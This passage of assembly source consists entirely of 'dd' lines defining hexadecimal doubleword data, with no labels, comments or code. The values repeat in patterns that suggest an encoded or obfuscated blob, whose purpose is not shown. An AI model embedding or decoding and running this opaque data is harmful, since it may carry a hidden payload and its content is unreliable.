		dd 0FD00EFFCh, 0EFFD00EEh, 0EFFD02h, 0FD00EFFFh, 0EFFD00EDh
		dd 0EFFD02h, 0FD00EFFEh, 0EFFD00ECh, 0EFFD03h, 0FD00EFFEh
		dd 0EFFD00EBh, 0EFFD04h, 0FD00EFF9h, 0EFFD00EBh, 0EFFD05h
		dd 0FD00EFF8h, 0EFFD00EAh, 0EFFD05h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD01h, 0FD00EFFCh
		dd 0EFFD00EDh, 0EFFD02h, 0FD00EFFEh, 0EFFD00ECh, 0EFFD04h
		dd 0FD00EFF9h, 0EFFD00EAh, 0EFFD05h, 0FD00EFFBh, 0EFFD00E9h
		dd 0EFFD07h, 0FD00EFFAh, 0EFFD00E7h, 0EFFD08h, 0FD00EFF4h
		dd 0EFFD00E6h, 0EFFD0Ah, 0FD00EFF7h, 0EFFD00E4h, 0EFFD0Bh
		dd 0FD00EFF1h, 0EFFD00E3h, 0EFFD0Dh, 0FD00EFF0h, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD02h, 0FD00EFFEh, 0EFFD00E8h, 0FDEC10h, 0FB09E8F5h
		dd 0EBF605E5h, 2E2FE0Ch, 0FD0FEEF3h, 0EFF500E3h, 0E7FD8Ch
		dd 0FD08EFB1h, 0EFF50023h, 0E7FD2Ch, 0FD08EF51h, 0EFF50083h
		dd 0E7FDECh, 0FD08EFE1h, 0EFF50073h, 0E7FD5Ch, 0FD08EF21h
		dd 0EFF500D3h, 0E7FDBCh, 0FD08EF81h, 0EFF50013h, 0E7FD02h
		dd 0FD08EF7Fh, 0EFF500ADh
		dd 0E7FDC2h, 0FD08EFDFh, 0EFF5004Dh, 0E7FD62h, 0FD08EF1Fh
		dd 0EFF500FDh, 0E7FD92h, 0FD08EFAFh, 0EFF5003Dh, 0E7FD32h
		dd 0FD08EF4Fh, 0EFF5009Dh, 0E7FDF2h, 0FD08EFF7h, 0EFF50065h
		dd 0E7FD4Ah, 0FD08EF37h, 0EFF500C5h, 0E7FDAAh, 0FD08EF97h
		dd 0EFF50005h, 0E7FD1Ah, 0FD08EF67h, 0EFF500B5h, 0E7FDDAh
		dd 0FD08EFC7h, 0EFF50055h, 0E7FD7Ah, 0FD08EF07h, 0EFF500E9h
		dd 0E7FD86h, 0FD08EFBBh, 0EFF50029h, 0E7FD26h, 0FD08EF5Bh
		dd 0EFF50089h, 0E7FDE6h, 0FD08EFEBh, 0EFF50079h, 0E7FD56h
		dd 0FD08EF2Bh, 0EFF500D9h, 0E7FDB6h, 0FD08EF8Bh, 0EFF50019h
		dd 0E7FD0Eh, 0FD08EF73h, 0EFF500A1h, 0E7FDCEh, 0FD08EFD3h
		dd 0EFF50041h, 0E7FD6Eh, 0FD08EF13h, 0EFF500F1h, 0E7FD9Eh
		dd 0FD08EFA3h, 0EFF50031h, 0E7FD3Eh, 0FD08EF43h, 0EFF50091h
		dd 0E7FDFEh, 0FD08EFFCh, 0EFF5006Eh, 0E7FD41h, 0FD08EF3Ch
		dd 0EFF500CEh, 0E7FDA1h, 0FD08EF9Ch, 0EFF5000Eh, 0E7FD11h
		dd 0FD08EF6Ch, 0EFF500BEh, 0E7FDD1h, 0FD08EFCCh, 0EFF5005Eh
		dd 0E7FD71h, 0FD08EF0Ch, 0EFF500E6h, 0E7FD89h, 0FD08EFB4h
		dd 0EFF50026h, 0E7FD29h, 0FD08EF54h, 0EFF50086h, 0E7FDE9h
		dd 0FD08EFE4h, 0EFF50076h, 0E7FD59h, 0FD08EF24h, 0EFF500D6h
		dd 0E7FDB9h, 0FD08EF84h, 0EFF50016h, 0E7FD05h, 0FD08EF78h
		dd 0EFF500AAh, 0E7FDC5h, 0FD08EFD8h, 0EFF5004Ah, 0E7FD65h
		dd 0FD08EF18h, 0EFF500FAh, 0E7FD95h, 0FD08EFA8h, 0EFF5003Ah
		dd 0E7FD35h, 0FD08EF48h, 0EFF5009Ah, 0E7FDF5h, 0FD08EFF0h
		dd 0EFF50062h, 0E7FD4Dh, 0FD08EF30h, 0EFF500C2h, 0E7FDADh
		dd 0FD08EF90h, 0EFF50002h, 0E7FD1Dh, 0FD08EF60h, 0EFF500B2h
		dd 0E7FDDDh, 0FD08EFC0h, 0EFF50052h, 0E7FD7Dh, 0FD08EF00h
		dd 0EFF400FCh, 0E6FC13h, 0FD09EF6Eh, 0EFF4017Ch, 0E6FD53h
		dd 0FD09EEAEh, 0EFF4003Ch, 0E6FCD3h, 0FD09EFCEh, 0EFF401DCh
		dd 0E6FDB3h, 0FD09EE4Eh, 0EFF4009Ch, 0E6FC73h, 0FD09EF0Eh
		dd 0EFF4011Ch, 0E6FD0Bh, 0FD09EEF6h, 0EFF40064h, 0E6FC8Bh
		dd 0FD09EFB6h, 0EFF401A4h, 0E6FDCBh, 0FD09EE36h, 0EFF400C4h
		dd 0E6FC2Bh, 0FD09EF56h, 0EFF40144h, 0E6FD6Bh, 0FD09EE96h
		dd 0EFF40004h, 0E6FCEBh, 0FD09EFE6h, 0EFF401F4h, 0E6FD9Bh
		dd 0FD09EE66h, 0EFF400B4h, 0E6FC5Bh, 0FD09EF26h, 0EFF40134h
		dd 0E6FD3Bh, 0FD09EEC6h, 0EFF40054h, 0E6FCBBh, 0FD09EF86h
		dd 0EFF40194h, 0E6FDFBh, 0FD09EE06h, 0EFF400E8h, 0E6FC07h
		dd 0FD09EF7Ah, 0EFF40168h, 0E6FD47h, 0FD09EEBAh, 0EFF40028h
		dd 0E6FCC7h, 0FD09EFDAh, 0EFF401C8h, 0E6FDA7h, 0FD09EE5Ah
		dd 0EFF40088h, 0E6FC67h, 0FD09EF1Ah, 0EFF40108h, 0E6FD17h
		dd 0FD09EEEAh, 0EFF40078h, 0E6FC97h, 0FD09EFAAh, 0EFF401B8h
		dd 0E6FDD7h, 0FD09EE2Ah, 0EFF400D8h, 0E6FC37h, 0FD09EF4Ah
		dd 0EFF40158h, 0E6FD77h, 0FD09EE8Ah, 0EFF40018h, 0E6FCF7h
		dd 0FD09EFF2h, 0EFF401E0h, 0E6FD8Fh, 0FD09EE72h, 0EFF400A0h
		dd 0E6FC4Fh, 0FD09EF32h, 0EFF40120h, 0E6FD2Fh, 0FD09EED2h
		dd 0EFF40040h, 0E6FCAFh, 0FD09EF92h, 0EFF40180h, 0E6FDEFh
		dd 0FD09EE12h, 0EFF400F0h, 0E6FC1Fh, 0FD09EF62h, 0EFF40170h
		dd 0E6FD5Fh, 0FD09EEA2h, 0EFF40030h, 0E6FCDFh, 0FD09EFC2h
		dd 0EFF401D0h, 0E6FDBFh, 0FD09EE42h, 0EFF40090h, 0E6FC7Fh
		dd 0FD09EF02h, 0EFF40110h, 0E8FD00h, 0FD07EFBDh, 0EFFA00CFh
		dd 0E8FD60h, 0FD07EFEDh, 0EFFA00BFh, 0E8FD30h, 0FD07EF8Dh
		dd 0EFFA00E7h, 0E8FD48h, 0FD07EFD5h, 0EFFA0087h, 0E8FD18h
		dd 0FD07EFA5h, 0EFFA00D7h, 0E8FD78h, 0FD07EFF9h, 0EFFA00ABh
		dd 0E8FD24h, 0FD07EF99h, 0EFFA00FBh, 0E8FD54h, 0FD07EFC9h
		dd 0EFFA009Bh, 0E7FD03h, 0FD08EF7Eh, 0EFF500ACh, 0E7FDC3h
		dd 0FD08EFDEh, 0EFF5004Ch, 0E7FD63h, 0FD08EF1Eh, 0EFF800EFh
		dd 0EAFD10h, 0FD05EFF5h, 0EFF800F7h, 0EAFD04h, 0FD05EFE9h
		dd 0EFF800E3h, 0EAFD1Ch, 0FD05EFFFh, 0EFF800FDh, 0EAFD0Ah
		dd 0FD05EFE7h, 0EFF800E9h, 0EAFD16h, 0FD05EFF3h, 0EFF800F1h
		dd 0EAFD01h, 0FD05EFECh, 0EFF800E6h, 0EAFD19h, 0FD05EFF8h
		dd 0EFF800FAh, 0EAFD0Dh, 0FD05EFE0h, 0EFF800ECh, 0EAFD13h
		dd 0FD05EFF6h, 0EFF800F4h, 0EAFD07h, 0FD05EFEAh, 0ECFF01EFh
		dd 5EAF904h, 0FB06E9FBh, 0E8FA07E8h, 8E7F508h, 0F508E7F5h
		dd 0E6F409E6h, 9E6F409h, 0F70AE5F7h, 0E5F70AE5h, 0AE5F70Ah
		dd 0F70AE5F7h, 0E4F60BE4h, 0BE4F60Bh, 0F60BE4F6h, 0E4F60BE4h
		dd 0CE3F10Ch, 0F10CE3F1h, 0E3F10CE3h, 0CE3F10Ch, 0F10CE3F1h
		dd 0E3F10CE3h, 0CE3F10Ch, 0F10CE3F1h, 0E2F00DE2h, 0DE2F00Dh
		dd 0F00DE2F0h, 0E2F00DE2h, 0DE2F00Dh, 0F00DE2F0h, 0E2F00DE2h
		dd 0DE2F00Dh, 0F30EE1F3h, 0E1F30EE1h, 0EE1F30Eh, 0F30EE1F3h
		dd 0E1F30EE1h, 0EE1F30Eh, 0F30EE1F3h, 0E1F30EE1h, 0EE1F30Eh
		dd 0F30EE1F3h, 0E1F30EE1h, 0EE1F30Eh, 0F30EE1F3h, 0E1F30EE1h
		dd 0EE1F30Eh, 0F30EE1F3h, 0E0F20FE0h, 0FE0F20Fh, 0F20FE0F2h
		dd 0E0F20FE0h, 0FE0F20Fh, 0F20FE0F2h, 0E0F20FE0h, 0FE0F20Fh
		dd 0F20FE0F2h, 0E0F20FE0h, 0FE0F20Fh, 0F20FE0F2h, 0E0F20FE0h
		dd 0FE0F20Fh, 0F20FE0F2h, 0E0F20FE0h, 11FFFD00h, 0EE13FDEFh
		dd 0FBE914FBh, 15FAE815h, 0EB16F9EBh, 0F9EB16F9h, 17F8EA17h
		dd 0EA17F8EAh, 0F7E518F7h, 18F7E518h, 0E518F7E5h, 0F7E518F7h
		dd 19F6E419h, 0E419F6E4h, 0F6E419F6h, 19F6E419h, 0E71AF5E7h
		dd 0F5E71AF5h, 1AF5E71Ah, 0E71AF5E7h, 0F5E71AF5h, 1AF5E71Ah
		dd 0E71AF5E7h, 0F5E71AF5h, 1BF4E61Bh, 0E61BF4E6h, 0F4E61BF4h
		dd 1BF4E61Bh, 0E61BF4E6h, 0F4E61BF4h, 1BF4E61Bh, 0E61BF4E6h
		dd 0F3E11CF3h, 1CF3E11Ch, 0E11CF3E1h, 0F3E11CF3h, 1CF3E11Ch
		dd 0E11CF3E1h, 0F3E11CF3h, 1CF3E11Ch, 0E11CF3E1h, 0F3E11CF3h
		dd 1CF3E11Ch, 0E11CF3E1h, 0F3E11CF3h, 1CF3E11Ch, 0E11CF3E1h
		dd 0F3E11CF3h, 1DF2E01Dh, 0E01DF2E0h, 0F2E01DF2h, 1DF2E01Dh
		dd 0E01DF2E0h, 0F2E01DF2h, 1DF2E01Dh, 0E01DF2E0h, 0F2E01DF2h
		dd 1DF2E01Dh, 0E01DF2E0h, 0F2E01DF2h, 1DF2E01Dh, 0E01DF2E0h
		dd 0F2E01DF2h, 1DF2E01Dh, 0FE02EEFDh, 0E8FB05EBh, 9E6F508h
		dd 0F60BE5F7h, 0E3F10CE3h, 0DE2F00Dh, 0F30EE1F3h, 0E0F20FE0h
		dd 10FFED10h, 0ED10FFEDh, 0FEEC11FEh, 11FEEC11h, 0EF12FDEFh
		dd 0FDEF12FDh, 13FCEE13h, 0EE13FCEEh, 0FBE914FBh, 14FBE914h
		dd 0E914FBE9h, 0FBE914FBh, 15FAE815h, 0E815FAE8h, 0FAE815FAh
		dd 15FAE815h, 0EB16F9EBh, 0F9EB16F9h, 16F9EB16h, 0EB16F9EBh
		dd 0F8EA17F8h, 17F8EA17h, 0EA17F8EAh, 0F8EA17F8h, 18F7E518h
		dd 0E518F7E5h, 0F7E518F7h, 18F7E518h, 0E518F7E5h, 0F7E518F7h
		dd 18F7E518h, 0E518F7E5h, 0F6E419F6h, 19F6E419h, 0E419F6E4h
		dd 0F6E419F6h, 19F6E419h, 0E419F6E4h, 0F6E419F6h, 19F6E419h
		dd 0E71AF5E7h, 0F5E71AF5h, 1AF5E71Ah, 0E71AF5E7h, 0F5E71AF5h
		dd 1AF5E71Ah, 0E71AF5E7h, 0F5E71AF5h, 1BF4E61Bh, 0E61BF4E6h
		dd 0F4E61BF4h, 1BF4E61Bh, 0E61BF4E6h, 0F4E61BF4h, 1BF4E61Bh
		dd 0E11BF4E6h, 0EFFD00EFh, 0EFFD01h, 0FD00EFFFh, 0EFFD00ECh
		dd 0EFFD04h, 0FD00EFF8h, 0EFFD00E9h, 0EFFD07h, 0FD00EFF5h
		dd 0EFFD00E5h, 0EFFD0Ch, 0FD00EFF3h, 0EFFD00FFh, 0EFFD14h
		dd 0FD00EFE5h, 0EFFD00F3h, 0EFFD20h, 0FD00EFD5h, 0EFFD00DFh
		dd 0EFFD38h, 0FD00EFBDh
		dd 0EFFD00BFh, 0EFFD60h, 0FD00EF8Dh, 0EFFD006Fh, 0EFFDA0h
		dd 0FD00EF3Dh, 0EFFD000Fh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EEh
		dd 0EFFD02h, 0FD00EFFEh, 0EFFD00EBh, 0EFFD06h, 0FD00EFF5h
		dd 0EFFD00E3h, 0EFFD10h, 0FD00EFE5h, 0EFFD00CFh, 0EFFD30h
		dd 0FD00EFBDh, 0EFFD008Fh, 0EFFD80h, 0FD00EF3Dh, 0EFFD01EFh
		dd 0EFFC80h, 0FD00EDFDh, 0EFFD03EFh, 0EFF900h, 0FD00E9FDh
		dd 0EFFD08EFh, 0EFF100h, 0FD00FFFDh, 0EFFD18EFh, 0EFDD00h
		dd 0FD00DFFDh, 0EFFD40EFh, 0EF9D00h, 0ED01752Dh, 0FFFC4F6Dh
		dd 10EE1F80h, 0FD00EFFDh, 0EFFD00EFh, 0FF1002FFh, 0FD00EFFDh
		dd 0EFFD00EFh, 10EE67A0h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFCh, 0FFFC9A57h, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 10EE1F80h, 0ED01753Dh, 0EFFD00EFh, 197CF820h, 0FD00EFFEh
		dd 0FFFC9BE7h, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 1002FF10h, 10EEAC80h, 0FD00EFFDh, 0FFFC5164h
		dd 0EFFD00h, 0ED01BE6Bh, 0F66E05CFh, 0EFFD01h, 0ED0174BDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 2FF1002h, 0FFFC515Fh, 197CF820h, 0FD00EFFCh,	0FFFC9B87h
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 1002FF10h, 10EEACD0h, 0E493EADDh, 0EFFD00EEh, 10EE6690h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0FF1002FFh, 0ED01BE0Dh, 0F66E05CFh, 0EFFD03h, 0ED017445h
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 2FF1002h, 0FFFC52FFh, 0EFFD00h, 0ED01BDE3h, 0EFFD00EEh
		dd 10EEAF2Ch, 0E493EADDh, 0EFFD00EBh, 10EE66F0h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0FF1002FFh
		dd 0ED01BDADh, 0EFFD00EFh, 10EEAF5Bh, 0FD00EFFCh, 0FFFC5289h
		dd 0EFFD02h, 0ED01BD8Ch, 0EFFD00EEh, 10EE2CC0h,	0FD00EFFDh
		dd 1002FF10h, 0EFFD00h,	0FD00EFF9h, 0EFFD00EFh,	0EFFD00h
		dd 0FD00EFFCh, 0FFFCD13Fh, 0EFFD00h, 2FF1002h, 0EFFD00EFh
		dd 0EFFD04h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD02h, 0ED0173CDh
		dd 0FFFC9CFFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0ED0173ADh, 0F66E05CFh, 0EFFD02h, 0ED01736Dh, 0EFFD00EEh
		dd 10EE61A0h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h,	2FF1002h
		dd 0EFFD00EFh, 0FF1002FFh, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFCh, 0EFFD00EEh, 10EE61B8h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0FFFD35B2h, 197CF820h,	0FD00EFFFh
		dd 0FFFC9C07h, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 1002FF10h, 10EEAFA0h, 0FD00EFFDh, 0FFFC5247h
		dd 197CF820h, 0FD00EFFFh, 0FFFC9DF7h, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 1002FF10h,	10EEAFC0h
		dd 0FD00EFFDh, 0FFFC5227h, 197CF820h, 0FD00EFFCh, 0FFFC9DA7h
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 1002FF10h, 10EEAFE0h, 0E493EADDh, 0EFFD00EEh, 10EE6070h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0FF1002FFh, 0ED01BCFDh, 0F66E05CFh, 0EFFD01h, 0ED017265h
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 2FF1002h, 0FFFC53CFh, 197CF820h, 0FD00EFFFh,	0FFFC9D2Fh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 1002FF10h, 10EEAE40h, 0FD00EFFDh, 0FFFC53A4h, 197CF820h
		dd 0FD00EFFFh, 0FFFC9D1Fh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 1002FF10h, 10EEAE60h, 0FD00EFFDh
		dd 0FFFC5384h, 197CF820h, 0FD00EFFFh, 0FFFC9ECFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 1002FF10h
		dd 10EEAE80h, 0FD00EFFDh, 0FFFC5364h, 197CF820h, 0FD00EFFFh
		dd 0FFFC9EBFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 1002FF10h, 10EEAEA0h, 0FD00EFFDh, 0FFFC5344h
		dd 197CF820h, 0FD00EFFFh, 0FFFC9E6Fh, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 1002FF10h,	10EEAEC0h
		dd 0FD00EFFDh, 0FFFC5324h, 197CF820h, 0FD00EFFFh, 0FFFC9E5Fh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 1002FF10h, 10EEAEE0h, 0FD00EFFDh, 0FFFC5304h, 197CF820h
		dd 0FD00EFFFh, 0FFFC9E0Fh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 1002FF10h, 10EEA900h, 0FD00EFFDh
		dd 0FFFC54E4h, 197CF820h, 0FD00EFF4h, 0FFFC9FFFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 1002FF10h
		dd 10EEA950h, 0FD00EFFDh, 0FFFC54CFh, 0EFFD01h,	0ED01BBD5h
		dd 0EFFD00EDh, 10EEA930h, 0FD00EFFEh, 0FFFC54D7h, 0EFFD04h
		dd 0ED01BBBDh, 0EFFD00EAh, 10EEA948h, 0FD00EFFBh, 0FFFC5488h
		dd 0EFFD06h, 0ED01BB92h, 0F66E05CFh, 0EFFD01h, 0ED017085h
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 2FF1002h, 0FFFC547Fh, 197CF820h, 0FD00EFF3h,	0FFFC9F4Fh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 1002FF10h, 10EEA9B0h, 0FD00EFFDh, 0FFFC5457h, 0EFFD01h
		dd 0ED01BB3Dh, 0EFFD00EDh, 10EEA9C8h, 0FD00EFFEh, 0FFFC543Fh
		dd 0EFFD04h, 0ED01BB25h, 0EFFD00EAh, 10EEA9E0h,	0FD00EFFBh
		dd 0FFFC5407h, 0EFFD07h, 0ED01BB0Dh, 0EFFD00E7h, 10EEA9F8h
		dd 0FD00EFF4h, 0FFFC55EFh, 0EFFD0Ah, 0ED01BAF5h, 0EFFD00E4h
		dd 10EEA810h, 0FD00EFF1h, 0FFFC55F7h, 197CF820h, 0FD00EFFFh
		dd 0FFFCA0DFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 1002FF10h, 10EEA830h, 0FD00EFFDh, 0FFFC55D7h
		dd 197CF820h, 0FD00EFF2h, 0FFFCA08Fh, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 1002FF10h,	10EEA850h
		dd 0FD00EFFDh, 0FFFC55B7h, 0EFFD01h, 0ED01BA9Dh, 0EFFD00EDh
		dd 10EEA868h, 0FD00EFFEh, 0FFFC559Fh, 0EFFD04h,	0ED01BA85h
		dd 0EFFD00EAh, 10EEA880h, 0FD00EFFBh, 0FFFC5567h, 0EFFD07h
		dd 0ED01BA6Dh, 0EFFD00E7h, 10EEA898h, 0FD00EFF4h, 0FFFC554Fh
		dd 0EFFD0Ah, 0ED01BA55h, 0EFFD00E4h, 10EEA8B0h,	0FD00EFF1h
		dd 0FFFC5557h, 0EFFD0Dh, 0ED01BA3Dh, 0F66E05CFh, 0EFFD02h
		dd 0ED014F05h, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 2FF1002h, 0FFFC550Fh, 0EFFD00h, 0ED01BA15h
		dd 0F66E05CFh, 0EFFD0Bh, 0ED014ED5h, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 2FF1002h, 0FFFC56EFh
		dd 0EFFD00h, 0ED01B9F5h, 0EFFD00EEh, 10EEAB10h,	0FD00EFFFh
		dd 0FFFC56F7h, 0EFFD03h, 0ED01B9DDh, 0EFFD00EBh, 10EEAB28h
		dd 0FD00EFF8h, 0FFFC56DFh, 0EFFD06h, 0ED01B9C5h, 0EFFD00E8h
		dd 10EEAB40h, 0FD00EFF5h, 0FFFC56A7h, 0EFFD09h,	0ED01B9ADh
		dd 0F66E05CFh, 0EFFD02h, 0ED014E5Dh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 2FF1002h, 0FFFC569Fh
		dd 0EFFD00h, 0ED01B985h, 0F66E05CFh, 0EFFD09h, 0ED014E2Dh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 2FF1002h, 0FFFC567Fh, 0EFFD00h, 0ED01B965h, 0EFFD00EEh
		dd 10EEABA0h, 0FD00EFFFh, 0FFFC5647h, 0EFFD03h,	0ED01B94Dh
		dd 0EFFD00EBh, 10EEABB8h
		dd 0FD00EFF8h, 0FFFC562Fh, 0EFFD06h, 0ED01B935h, 0EFFD00E8h
		dd 10EEABD0h, 0E493EADDh, 0EFFD00EDh, 10EE5F38h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0FF1002FFh
		dd 0ED01B90Dh, 0EFFD00EFh, 10EEABF8h, 0E493EADDh, 0EFFD00E0h
		dd 10EE5F68h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0FF1002FFh, 0ED01B8EDh, 0EFFD00EFh, 10EEAA1Bh
		dd 0FD00EFFCh, 0FFFC57C9h, 0EFFD02h, 0ED01B8CCh, 0EFFD00ECh
		dd 10EEAA3Ch, 0FD00EFF9h, 0FFFC57A8h, 0EFFD05h,	0ED01B8AFh
		dd 0EFFD00E9h, 10EEAA5Dh, 0FD00EFFAh, 0FFFC5787h, 0EFFD08h
		dd 0ED01B88Eh, 0EFFD00E6h, 10EEAA7Eh, 0FD00EFF7h, 0FFFC5766h
		dd 0EFFD0Bh, 0ED01B869h, 0EFFD00E3h, 10EEAA9Fh,	0FD00EFF0h
		dd 0FFFC5745h, 197CF820h, 0FD00EFFFh, 0FFFCA3EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 1002FF10h
		dd 10EEAAC0h, 0FD00EFFDh, 0FFFC5727h, 197CF820h, 0FD00EFF9h
		dd 0FFFCA3DFh, 0EFFD02h, 0ED014CADh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 1002FF10h, 0EFFD00h, 2FF1002h, 0EFFD00EFh
		dd 0FF1002FFh, 0FD00EFFDh, 1002FF10h, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD01h, 0FD00EFFCh, 0FFFCA397h, 0EFFD02h
		dd 0FD00EFFFh, 0EFFD00ECh, 0EFFD01h, 0ED014C75h, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0FFFDA3E8h, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 10EF5EB3h, 0E493EADDh, 0EFFD00EEh, 10EE5EB8h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0FF1002FFh, 0ED01B80Dh, 0F66E05CFh, 0EFFD02h, 0ED014C1Dh
		dd 0EFFD00EEh, 10EE5EF0h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 2FF1002h, 0EFFD00EFh, 0FF1002FFh, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFCh, 0EFFD00EEh, 10EE5908h,	0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0FFFDAC43h, 197CF820h
		dd 0FD00EFFEh, 0FFFCA4D7h, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 1002FF10h, 10EEA520h, 0FD00EFFDh
		dd 0FFFC58C7h, 0EFFD01h, 0ED01B7CEh, 0F66E05CFh, 0EFFD02h
		dd 0ED014B8Dh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 2FF1002h, 0FFFC58BFh, 0EFFD00h, 0ED01B7A5h
		dd 0F66E05CFh, 0EFFD03h, 0ED014B5Dh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 2FF1002h, 0FFFC589Fh
		dd 0FF1002FFh, 0ED01B786h, 1002FF10h, 10EEA586h, 0E493EADDh
		dd 0EFFD00EDh, 10EE59D8h, 0FD00EFFCh, 0FFFCA407h, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0FF1002FFh, 0FD00EFFDh, 1002FF10h
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD01h, 0FD00EFFCh
		dd 0FFFCA5EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0ED0056F3h, 0F66E05CFh, 0EFFD02h, 0ED014ACDh, 0EFFD00EEh
		dd 10EE5840h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h,	2FF1002h
		dd 0EFFD00EFh, 0FF1002FFh, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFCh, 0EFFD00EEh, 10EE5858h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0FFFDBA11h, 197CF820h,	0FD00EFFCh
		dd 0FFFCA567h, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 1002FF10h, 10EEA5C0h, 0E493EADDh, 0EFFD00EEh
		dd 10EE58B0h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0FF1002FFh, 0ED01B71Dh, 0F66E05CFh, 0EFFD01h
		dd 0ED014A25h, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 2FF1002h, 0FFFC59EFh, 197CF820h, 0FD00EFFCh
		dd 0FFFCA6EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 1002FF10h, 10EEA420h, 0E493EADDh, 0EFFD00EEh
		dd 10EE5B28h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h,	0FD00EFFDh
		dd 0EFFD00EFh, 0FF1002FFh, 0ED01B6BDh, 0F66E05CFh, 0EFFD02h
